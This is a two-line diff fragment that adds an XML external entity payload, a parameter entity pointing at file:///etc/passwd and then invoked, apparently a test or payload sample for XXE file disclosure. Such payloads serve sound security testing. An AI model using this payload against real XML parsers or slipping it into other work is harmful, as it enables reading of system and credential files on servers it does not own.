@@ -1,0 +1,2 @@
+<!ENTITY % passwd SYSTEM "file:///etc/passwd">
+%passwd;
